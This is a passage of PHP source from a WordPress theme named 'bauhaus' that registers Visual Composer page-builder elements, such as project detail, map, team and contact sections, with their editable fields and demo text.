			'heading' => esc_html__( 'title', 'bauhaus' ),
			'param_name' => 'title',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'creative & dedicated is things that bauhaus studio brings for your house', 'bauhaus' ),

		),


		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Testimonials items', 'bauhaus' ),
			'param_name' => 'items',
			'group' => esc_html__( 'Partner items', 'bauhaus' ),
			'params' => array(
				array(
					'type' => 'textarea',
					'heading' => esc_html__( ' Testimonials text', 'bauhaus' ),
					'param_name' => 'text',
					'description' => esc_html__( 'Insert text', 'bauhaus' ),
				),


				array(
					'type' => 'textfield',
					'heading' => esc_html__( 'author', 'bauhaus' ),
					'param_name' => 'author',
					'description' => esc_html__( 'Insert text', 'bauhaus' ),
					'value' => esc_html__( 'David & Elisa', 'bauhaus' ),

				),
				array(
					'type' => 'textfield',
					'heading' => esc_html__( 'text', 'bauhaus' ),
					'param_name' => 'text_i',
					'description' => esc_html__( 'Insert text', 'bauhaus' ),
					'value' => esc_html__( 'Apartment view lake at Brooklyn', 'bauhaus' ),

				),


			)
		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );


$slider_arr = array( 'Select alias' => '' );
if ( class_exists( 'RevSlider' ) ) {
	$sld = new RevSlider();
	$sliders = $sld->getArrSliders();
	if ( !empty( $sliders ) ) {
		foreach ( $sliders as $slider ) {
			//get alias all slider
			$slider_arr = array_merge( $slider_arr, array( $slider->getTitle() => $slider->getParam( 'alias', 'false' ) ) );


		}
	}


}
/***********bauhaus_project_detail***********/
vc_map( array(
	'name' => esc_html__( 'bauhaus Project detail ', 'bauhaus' ),
	'base' => 'bauhaus_project_detail',
	'icon' => plugins_url( '/icon/gallery.png', __FILE__ ), // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( 'Site header', 'bauhaus' ),
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),
		array(
			'type' => 'dropdown',
			'heading' => esc_html__( 'Select Slider Revolution alias', 'bauhaus' ),
			'param_name' => 'alias_slider',
			'description' => esc_html__( 'select the alias of the slider', 'bauhaus' ),
			'value' => $slider_arr
		),


		array(
			'type' => 'textfield',
			'class' => '',
			'heading' => esc_html__( 'Heading', 'bauhaus' ),
			'param_name' => 't',
			'value' => esc_html__( 'Small House Near Wroclaw', 'bauhaus' ),
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),
		array(
			'type' => 'textfield',
			'class' => '',
			'heading' => esc_html__( 'hide information text', 'bauhaus' ),
			'param_name' => 'hide_info',
			'value' => 'hide information',
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),

		array(
			'type' => 'textfield',
			'class' => '',
			'heading' => esc_html__( 'show information text', 'bauhaus' ),
			'param_name' => 'show_info',
			'value' => 'show information',
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),
		array(
			'type' => 'textarea_html',
			'class' => '',
			'heading' => esc_html__( 'Desciption', 'bauhaus' ),
			'param_name' => 'content',
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),


		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Project  items', 'bauhaus' ),
			'param_name' => 'items',
			'params' => array(


				array(
					'type' => 'textfield',
					'holder' => 'div',
					'class' => '',
					'heading' => esc_html__( 'Left text', 'bauhaus' ),
					'param_name' => 'left_text',
					'value' => esc_html__( 'Clients:', 'bauhaus' ),
					'description' => esc_html__( 'insert text', 'bauhaus' )
				),
				array(
					'type' => 'textfield',
					'holder' => 'div',
					'class' => '',
					'heading' => esc_html__( 'Right text', 'bauhaus' ),
					'param_name' => 'right_text',
					'value' => esc_html__( 'Ethan Hunt', 'bauhaus' ),
					'description' => esc_html__( 'insert text', 'bauhaus' )
				),


			),

		),


		array(
			'type' => 'textfield',
			'class' => '',
			'heading' => esc_html__( 'Share  text', 'bauhaus' ),
			'param_name' => 't_social',
			'value' => 'Share:',
			'description' => esc_html__( 'insert text', 'bauhaus' )
		),

		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Social items', 'bauhaus' ),
			'param_name' => 'items2',
			'params' => array(


				array(
					'type' => 'textfield',
					'class' => '',
					'heading' => esc_html__( 'social url', 'bauhaus' ),
					'param_name' => 'url',
					'value' => '#',
					'description' => esc_html__( 'insert url', 'bauhaus' )
				),


				array(
					'type' => 'iconpicker',
					'heading' => esc_html__( 'The icons  ', 'bauhaus' ),
					'param_name' => 'icon',
					'value' => '',
					'description' => esc_html__( 'insert icon', 'bauhaus' ),
					'settings' => array(
						'emptyIcon' => false,
						'iconsPerPage' => 4000,
					)
				),


			),

		),


	),
	array(
		'type' => 'css_editor',
		'heading' => esc_html__( 'Css', 'bauhaus' ),
		'param_name' => 'css',
		'group' => esc_html__( 'Design options', 'bauhaus' ),
	),


) );

/***********bauhaus_map_section***********/
vc_map( array(

	'name' => esc_html__( 'bauhaus Map Section', 'bauhaus' ),
	'base' => 'bauhaus_map_section',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'icon' => plugins_url( '/icon/marker.png', __FILE__ ), // Simply pass url to your icon here

	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'params' => array(

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'heading', 'bauhaus' ),
			'param_name' => 'vertical_title',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'contact', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'heading', 'bauhaus' ),
			'param_name' => 'title',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'enjoy coffee with us', 'bauhaus' ),

		),

		array(
			'type' => 'dropdown',
			'heading' => esc_html__( 'Contact map visibility', 'bauhaus' ),
			'param_name' => 'map_visibility',
			'description' => esc_html__( 'Show or hide map', 'bauhaus' ),
			'value' => array(
				esc_html__( 'Show', 'bauhaus' ) => '1',
				esc_html__( 'Hide', 'bauhaus' ) => '2',
			),
			'group' => esc_html__( 'Map', 'bauhaus' ),
		),

		array(
			'type' => 'dropdown',
			'heading' => esc_html__( 'Contact information visibility', 'bauhaus' ),
			'param_name' => 'contact_visibility',
			'description' => esc_html__( 'Show or hide Contact information', 'bauhaus' ),
			'value' => array(
				esc_html__( 'Show', 'bauhaus' ) => '1',
				esc_html__( 'Hide', 'bauhaus' ) => '2',
			),
			'group' => esc_html__( 'Map', 'bauhaus' ),
		),

		array(
			'type' => 'dropdown',
			'heading' => esc_html__( 'Map info visibility', 'bauhaus' ),
			'param_name' => 'map_info_visibility',
			'description' => esc_html__( 'Show or hide map info', 'bauhaus' ),
			'group' => esc_html__( 'Map info', 'bauhaus' ),
			'value' => array(
				esc_html__( 'Show', 'bauhaus' ) => '1',
				esc_html__( 'Hide', 'bauhaus' ) => '2',
			),

		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Map marker brand name', 'bauhaus' ),
			'param_name' => 'map_text',
			'value' => esc_html__( 'bauhaus', 'bauhaus' ),
			'description' => esc_html__( 'Add your map marker brand name', 'bauhaus' ),
			'group' => esc_html__( 'Map info', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Map marker brand text', 'bauhaus' ),
			'param_name' => 'map_brand_text',
			'value' => esc_html__( 'architecture', 'bauhaus' ),
			'description' => esc_html__( 'Add your map marker text', 'bauhaus' ),
			'group' => esc_html__( 'Map info', 'bauhaus' ),
		),


		array(
			'type' => 'attach_image',
			"holder" => "img",
			'heading' => esc_html__( 'Brand Image', 'bauhaus' ),
			'param_name' => 'img_src',
			'value' => '',
			'description' => esc_html__( 'Select images from media library.', 'bauhaus' ),
			'group' => esc_html__( 'Map info', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'holder' => 'div',
			'heading' => esc_html__( 'insert url ', 'bauhaus' ),
			'param_name' => 'url',
			'description' => esc_html__( 'url ', 'bauhaus' ),
			'group' => esc_html__( 'Map info', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'holder' => 'div',
			'heading' => esc_html__( 'insert text url ', 'bauhaus' ),
			'param_name' => 'url_t',
			'description' => esc_html__( ' text url  ', 'bauhaus' ),
			'group' => esc_html__( 'Map info', 'bauhaus' ),

		),

		array(
			'type' => 'param_group',
			'holder' => 'div',
			'heading' => esc_html__( 'Map info values', 'bauhaus' ),
			'param_name' => 'map_items',
			'group' => esc_html__( 'Map info', 'bauhaus' ),
			'params' => array(
				array(
					'type' => 'iconpicker',
					'heading' => esc_html__( 'The icons', 'bauhaus' ),
					'param_name' => 'icon',
					'value' => '',
					'description' => esc_html__( 'insert icon', 'bauhaus' ),
					'settings' => array(
						'emptyIcon' => false,
						'iconsPerPage' => 4000,
					)

				),
				array(
					'type' => 'textarea',
					'heading' => esc_html__( 'Description ', 'bauhaus' ),
					'param_name' => 'content',
					'description' => esc_html__( 'insert text', 'bauhaus' ),

				),

			),
		),


		/*************************/

		array(
			'type' => 'textfield',
			'holder' => 'div',
			'heading' => esc_html__( 'insert lat coordinates ', 'bauhaus' ),
			'param_name' => 'lat',
			'description' => esc_html__( 'insert lat for example -45.200 ', 'bauhaus' ),

			'group' => esc_html__( 'Map', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'holder' => 'div',
			'heading' => esc_html__( 'insert lng coordinates ', 'bauhaus' ),
			'param_name' => 'lng',
			'description' => esc_html__( 'insert lng for example -72.4310 ', 'bauhaus' ),

			'group' => esc_html__( 'Map', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'holder' => 'div',
			'heading' => esc_html__( 'insert zooms ', 'bauhaus' ),
			'param_name' => 'zoom',
			'description' => esc_html__( 'insert zoom for example 8', 'bauhaus' ),
			'value' => 14,
			'group' => esc_html__( 'Map', 'bauhaus' ),
		),


		/******************/
		array(
			'type' => 'param_group',
			'holder' => 'div',
			'heading' => esc_html__( 'Map info values', 'bauhaus' ),
			'param_name' => 'info_items',
			'group' => esc_html__( 'Map', 'bauhaus' ),
			'params' => array(

				array(
					'type' => 'textarea',
					'heading' => esc_html__( 'Title ', 'bauhaus' ),
					'param_name' => 't',
					'description' => esc_html__( 'insert text', 'bauhaus' ),

				),

				array(
					'type' => 'param_group',
					'holder' => 'div',
					'heading' => esc_html__( 'Items values', 'bauhaus' ),
					'group' => esc_html__( 'Contact items', 'bauhaus' ),
					'param_name' => 'items',
					'params' => array(

						array(
							'type' => 'textfield',
							'heading' => esc_html__( 'Title ', 'bauhaus' ),
							'param_name' => 't',
							'description' => esc_html__( 'insert text', 'bauhaus' ),

						),
						array(
							'type' => 'textarea',
							'heading' => esc_html__( 'Description ', 'bauhaus' ),
							'param_name' => 'content',
							'description' => 'insert text',
							'bauhaus',

						),

					),
				),


			),
		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );


/*
* bauhaus Heading Section
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Heading Section ', 'bauhaus' ),
	'base' => 'bauhaus_heading_section',
	'icon' => plugins_url( '/icon/heading.png', __FILE__ ), // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),


		array(
			'type' => 'textarea',
			'heading' => esc_html__( 'heading', 'bauhaus' ),
			'param_name' => 't',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'We Do Great Design For Creative Folks.', 'bauhaus' ),

		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );


/*
* bauhaus Section Partners
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Section image', 'bauhaus' ),
	'base' => 'bauhaus_section_image',
	'icon' => plugins_url( '/icon/image.png', __FILE__ ), // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),

		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );


/*
* Section about-info
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Section About information', 'bauhaus' ),
	'base' => 'bauhaus_about_information',
	'icon' => get_template_directory_uri() . '/icon/about.png', // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'heading', 'bauhaus' ),
			'param_name' => 'title',
			'value' => esc_html__( 'Brief About Us. ', 'bauhaus' ),
			'description' => esc_html__( 'insert text ', 'bauhaus' ),

		),
		array(
			'type' => 'textarea_html',
			'heading' => esc_html__( 'Text description', 'bauhaus' ),
			'param_name' => 'content',
			'description' => esc_html__( 'insert text ', 'bauhaus' ),

		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );


/*
* bauhaus Section dots
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Section dots', 'bauhaus' ),
	'base' => 'bauhaus_section_dots',
	'icon' => plugins_url( '/icon/Rate.png', __FILE__ ), // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Heading', 'bauhaus' ),
			'param_name' => 't',
			'description' => esc_html__( 'insert heading', 'bauhaus' ),
			'value' => esc_html__( 'What We Do', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Heading', 'bauhaus' ),
			'param_name' => 't2',
			'description' => esc_html__( 'insert heading', 'bauhaus' ),
			'value' => esc_html__( 'Great Our Client', 'bauhaus' ),
		),

		array(
			'type' => 'dropdown',
			'heading' => esc_html__( 'Partners block visibility', 'bauhaus' ),
			'param_name' => 'partners_visibility',
			'description' => esc_html__( 'Show or hide Partners block', 'bauhaus' ),
			'value' => array(
				esc_html__( 'Show', 'bauhaus' ) => '1',
				esc_html__( 'Hide', 'bauhaus' ) => '2',
			),

		),

		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Text blocks ', 'bauhaus' ),
			'param_name' => 'items',
			'group' => esc_html__( 'Partner items', 'bauhaus' ),
			'params' => array(
				array(
					'type' => 'iconpicker',
					'heading' => esc_html__( 'The icons  ', 'bauhaus' ),
					'param_name' => 'icon',
					'value' => '',
					'description' => esc_html__( 'insert icon', 'bauhaus' ),
					'settings' => array(
						'emptyIcon' => false,
						'iconsPerPage' => 4000,
					)
				),


				array(
					'type' => 'textfield',
					'heading' => esc_html__( 'heading ', 'bauhaus' ),
					'param_name' => 't',
					'description' => esc_html__( 'insert heading', 'bauhaus' ),
					'value' => esc_html__( 'Architecture', 'bauhaus' ),
				),

				array(
					'type' => 'textarea',
					'heading' => esc_html__( 'description', 'bauhaus' ),
					'param_name' => 'desc',
					'description' => esc_html__( 'insert heading', 'bauhaus' ),
					'value' => esc_html__( 'First stages in a project are very important to understand your client´s needs. With many different tools we approach to our customers the best solutions to know their targets, their audiences and planning from the very first stage each movement to swim the whole team into the same pool', 'bauhaus' ),
				),


			)
		),


		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Partner items', 'bauhaus' ),
			'param_name' => 'items2',
			'group' => esc_html__( 'Partner items', 'bauhaus' ),
			'params' => array(
				array(
					'type' => 'attach_image',
					"holder" => "img",
					'heading' => esc_html__( 'Image', 'bauhaus' ),
					'param_name' => 'img_src',
					'value' => '',
					'description' => esc_html__( 'Select images from media library.', 'bauhaus' ),
				),


			)
		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );


/*
* bauhaus Section Team
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Section team', 'bauhaus' ),
	'base' => 'bauhaus_section_team',
	'icon' => plugins_url( '/icon/conference.png', __FILE__ ), // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Heading', 'bauhaus' ),
			'param_name' => 't',
			'description' => esc_html__( 'insert heading', 'bauhaus' ),
			'value' => esc_html__( 'MEET OUR TEAM', 'bauhaus' ),
		),


		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Team item  ', 'bauhaus' ),
			'param_name' => 'items',
			'group' => esc_html__( 'Team items', 'bauhaus' ),
			'params' => array(

				array(
					'type' => 'attach_image',
					"holder" => "img",
					'heading' => esc_html__( 'Image', 'bauhaus' ),
					'param_name' => 'img_src',
					'value' => '',
					'description' => esc_html__( 'Select images from media library.', 'bauhaus' ),
				),
				array(
					'type' => 'textfield',
					'heading' => esc_html__( 'name ', 'bauhaus' ),
					'param_name' => 'name',
					'description' => esc_html__( 'insert name', 'bauhaus' ),
					'value' => esc_html__( 'Alex Ferguson', 'bauhaus' ),
				),

				array(
					'type' => 'textarea',
					'heading' => esc_html__( 'specialization', 'bauhaus' ),
					'param_name' => 'spec',
					'description' => esc_html__( 'insert text', 'bauhaus' ),
					'value' => esc_html__( 'CEO Founder', 'bauhaus' ),
				),
				array(
					'type' => 'textfield',
					'heading' => esc_html__( 'Email', 'bauhaus' ),
					'param_name' => 'email',
					'description' => esc_html__( 'insert email', 'bauhaus' ),
					'value' => esc_html__( '', 'bauhaus' ),
				),

				array(
					'type' => 'param_group',
					'heading' => esc_html__( 'Social links ', 'bauhaus' ),
					'param_name' => 'items2',
					'group' => esc_html__( 'Partner items', 'bauhaus' ),
					'params' => array(

						array(
							'type' => 'iconpicker',
							'heading' => esc_html__( 'The icons 1 ', 'bauhaus' ),
							'param_name' => 'icon',
							'value' => '',
							'description' => esc_html__( 'insert icon', 'bauhaus' ),
							'settings' => array(
								'emptyIcon' => false,
								'iconsPerPage' => 4000,
							)
						),

						array(
							'type' => 'textfield',
							'heading' => esc_html__( 'url', 'bauhaus' ),
							'param_name' => 'url',
							'description' => esc_html__( 'insert url', 'bauhaus' ),
							'value' => esc_html__( '#', 'bauhaus' ),
						),


					)
				),


			)
		),


		array(
			'type' => 'textarea_html',
			'heading' => esc_html__( ' Insert contact form shortcode', 'bauhaus' ),
			'param_name' => 'content',
			'description' => esc_html__( 'insert shortcode', 'bauhaus' ),

		),

		array(
			'type' => 'textarea',
			'heading' => esc_html__( 'Upload resume (text)', 'bauhaus' ),
			'param_name' => 'resume',
			'description' => esc_html__( 'insert text', 'bauhaus' ),

		),
		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );


/***********bauhaus_map_section***********/
vc_map( array(

	'name' => esc_html__( 'bauhaus Map Section 2', 'bauhaus' ),
	'base' => 'bauhaus_map_section2',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'icon' => plugins_url( '/icon/Map.png', __FILE__ ), // Simply pass url to your icon here
	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'params' => array(

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'heading', 'bauhaus' ),
			'param_name' => 'vertical_title',
			'description' => esc_html__( 'Insert text', 'bauhaus' ),
			'value' => esc_html__( 'contact', 'bauhaus' ),

		),
		array(
			'type' => 'dropdown',
			'heading' => esc_html__( 'Map info visibility', 'bauhaus' ),
			'param_name' => 'map_info_visibility',
			'description' => esc_html__( 'Show or hide map info', 'bauhaus' ),
			'value' => array(
				esc_html__( 'Show', 'bauhaus' ) => '1',
				esc_html__( 'Hide', 'bauhaus' ) => '2',
			),

		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Map marker brand name', 'bauhaus' ),
			'param_name' => 'map_text',
			'value' => esc_html__( 'bauhaus', 'bauhaus' ),
			'description' => esc_html__( 'Add your map marker brand name', 'bauhaus' ),
			'group' => esc_html__( 'Map info', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Map marker brand text', 'bauhaus' ),
			'param_name' => 'map_brand_text',
			'value' => esc_html__( 'architecture', 'bauhaus' ),
			'description' => esc_html__( 'Add your map marker text', 'bauhaus' ),
			'group' => esc_html__( 'Map info', 'bauhaus' ),
		),


		array(
			'type' => 'attach_image',
			"holder" => "img",
			'heading' => esc_html__( 'Brand Image', 'bauhaus' ),
			'param_name' => 'img_src',
			'value' => '',
			'description' => esc_html__( 'Select images from media library.', 'bauhaus' ),
			'group' => esc_html__( 'Map info', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'holder' => 'div',
			'heading' => esc_html__( 'insert url ', 'bauhaus' ),
			'param_name' => 'url',
			'description' => esc_html__( 'url ', 'bauhaus' ),
			'group' => esc_html__( 'Map info', 'bauhaus' ),

		),
		array(
			'type' => 'textfield',
			'holder' => 'div',
			'heading' => esc_html__( 'insert text url ', 'bauhaus' ),
			'param_name' => 'url_t',
			'description' => esc_html__( ' text url  ', 'bauhaus' ),
			'group' => esc_html__( 'Map info', 'bauhaus' ),

		),
		/*************************/

		array(
			'type' => 'textfield',
			'holder' => 'div',
			'heading' => esc_html__( 'insert lat coordinates ', 'bauhaus' ),
			'param_name' => 'lat',
			'description' => esc_html__( 'insert lat for example -37.816248 ', 'bauhaus' ),

			'group' => esc_html__( 'Map', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'holder' => 'div',
			'heading' => esc_html__( 'insert lng coordinates ', 'bauhaus' ),
			'param_name' => 'lng',
			'description' => esc_html__( 'insert lng for example 144.965981 ', 'bauhaus' ),

			'group' => esc_html__( 'Map', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'holder' => 'div',
			'heading' => esc_html__( 'insert zooms ', 'bauhaus' ),
			'param_name' => 'zoom',
			'description' => esc_html__( 'insert zoom for example 8', 'bauhaus' ),
			'value' => 14,
			'group' => esc_html__( 'Map', 'bauhaus' ),
		),

		array(
			'type' => 'param_group',
			'holder' => 'div',
			'heading' => esc_html__( 'Map info values', 'bauhaus' ),
			'param_name' => 'map_items',
			'group' => esc_html__( 'Map info', 'bauhaus' ),
			'params' => array(
				array(
					'type' => 'iconpicker',
					'heading' => esc_html__( 'The icons', 'bauhaus' ),
					'param_name' => 'icon',
					'value' => '',
					'description' => esc_html__( 'insert icon', 'bauhaus' ),
					'settings' => array(
						'emptyIcon' => false,
						'iconsPerPage' => 4000,
					)

				),
				array(
					'type' => 'textarea',
					'heading' => esc_html__( 'Description ', 'bauhaus' ),
					'param_name' => 'content',
					'description' => esc_html__( 'insert text', 'bauhaus' ),

				),

			),
		),


		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );


/*
* bauhaus Section contacts
*/
vc_map( array(
	'name' => esc_html__( 'bauhaus Section contacts', 'bauhaus' ),
	'base' => 'bauhaus_section_contacts',
	'icon' => plugins_url( '/icon/contact.png', __FILE__ ), // Simply pass url to your icon here
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'params' => array(
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
			'description' => esc_html__( 'Add Your Section ID', 'bauhaus' ),
		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( ' Section Heading', 'bauhaus' ),
			'param_name' => 't',
			'description' => esc_html__( 'insert heading', 'bauhaus' ),
			'value' => esc_html__( 'Keep in touch', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Heading', 'bauhaus' ),
			'param_name' => 't2',
			'description' => esc_html__( 'insert heading', 'bauhaus' ),
			'group' => esc_html__( 'Left block', 'bauhaus' ),

		),
		array(
			'type' => 'textarea',
			'heading' => esc_html__( 'text', 'bauhaus' ),
			'param_name' => 'text',
			'description' => esc_html__( 'insert heading', 'bauhaus' ),
			'group' => esc_html__( 'Left block', 'bauhaus' ),

		),


		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Text items ', 'bauhaus' ),
			'param_name' => 'items',
			'group' => esc_html__( 'Left block', 'bauhaus' ),
			'params' => array(

				array(
					'type' => 'textarea',
					'heading' => esc_html__( 'text', 'bauhaus' ),
					'param_name' => 'text',
					'description' => esc_html__( 'insert heading', 'bauhaus' ),
					'group' => esc_html__( 'Left block', 'bauhaus' ),

				),


			)
		),


		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'right block heading', 'bauhaus' ),
			'param_name' => 'right_heading',
			'description' => esc_html__( 'insert heading', 'bauhaus' ),
			'value' => esc_html__( 'Call directly:', 'bauhaus' ),
			'group' => esc_html__( 'Right block', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'phone number', 'bauhaus' ),
			'param_name' => 'number',
			'description' => esc_html__( 'insert number', 'bauhaus' ),
			'value' => esc_html__( '+99 (0) 344 956 4050', 'bauhaus' ),
			'group' => esc_html__( 'Right block', 'bauhaus' ),
		),
		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'title', 'bauhaus' ),
			'param_name' => 'w_title',
			'description' => esc_html__( 'insert text', 'bauhaus' ),
			'value' => esc_html__( 'Work Hours', 'bauhaus' ),
			'group' => esc_html__( 'Right block', 'bauhaus' ),
		),

		array(
			'type' => 'textarea',
			'heading' => esc_html__( 'description', 'bauhaus' ),
			'param_name' => 'w_desc',
			'description' => esc_html__( 'insert text', 'bauhaus' ),
			'value' => esc_html__( 'Monday - Friday : 08h00 - 17h30
             Saturday: 08h00 - 12h00, Sunday off work', 'bauhaus' ),
			'group' => esc_html__( 'Right block', 'bauhaus' ),
		),

		array(
			'type' => 'textfield',
			'heading' => esc_html__( ' Social title', 'bauhaus' ),
			'param_name' => 'soc_title',
			'description' => esc_html__( 'insert text', 'bauhaus' ),
			'value' => esc_html__( 'Follow us', 'bauhaus' ),
			'group' => esc_html__( 'Right block', 'bauhaus' ),
		),

		array(
			'type' => 'param_group',
			'heading' => esc_html__( 'Social icons ', 'bauhaus' ),
			'param_name' => 'items2',
			'group' => esc_html__( 'Right block', 'bauhaus' ),
			'params' => array(


				array(
					'type' => 'iconpicker',
					'heading' => esc_html__( 'The icons  ', 'bauhaus' ),
					'param_name' => 'icon',
					'value' => '',
					'description' => esc_html__( 'insert icon', 'bauhaus' ),
					'settings' => array(
						'emptyIcon' => false,
						'iconsPerPage' => 4000,
					)
				),

				array(
					'type' => 'textfield',
					'heading' => esc_html__( ' Social url', 'bauhaus' ),
					'param_name' => 'soc_url',
					'description' => esc_html__( 'insert text', 'bauhaus' ),
					'value' => esc_html__( '#', 'bauhaus' ),
					'group' => esc_html__( 'Right block', 'bauhaus' ),
				),


			)
		),

		array(
			'type' => 'css_editor',
			'heading' => esc_html__( 'Css', 'bauhaus' ),
			'param_name' => 'css',
			'group' => esc_html__( 'Design options', 'bauhaus' ),
		),


	),


) );

/*************Contact form section****************/
vc_map( array(

	'name' => esc_html__( 'Contact form section', 'bauhaus' ),
	'base' => 'bauhaus_form_section',
	'show_settings_on_create' => true,
	'category' => esc_html__( 'bauhaus', 'bauhaus' ),
	'description' => esc_html__( '', 'bauhaus' ),
	'icon' => get_template_directory_uri() . '/icon/message.png', // Simply pass url to your icon here
	'custom_markup' => '{{title}}<div class="vc_btn3-container"><h4 class="team-name"></h4></div>',
	'params' => array(

		array(
			'type' => 'textfield',
			'heading' => esc_html__( 'Section ID', 'bauhaus' ),
			'param_name' => 'section_id',
